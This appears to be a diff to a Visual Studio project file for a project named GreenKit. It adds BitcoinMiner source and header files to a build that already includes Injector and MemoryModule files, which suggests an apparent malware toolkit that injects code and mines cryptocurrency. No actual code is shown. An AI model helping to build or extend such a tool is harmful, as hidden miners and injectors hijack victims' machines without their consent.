@@ -84,6 +84,7 @@
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="..\GreenKit\utils.h" />
+    <ClInclude Include="BitcoinMiner.h" />
     <ClInclude Include="GreenKitExe.h" />
     <ClInclude Include="Injector.h" />
     <ClInclude Include="MemoryModule.h" />
@@ -93,6 +94,7 @@
     <ClInclude Include="targetver.h" />
   </ItemGroup>
   <ItemGroup>
+    <ClCompile Include="..\GreenKit\BitcoinMiner.cpp" />
     <ClCompile Include="..\GreenKit\utils.cpp" />
     <ClCompile Include="GreenKitExe.cpp" />
     <ClCompile Include="Injector.cpp" />
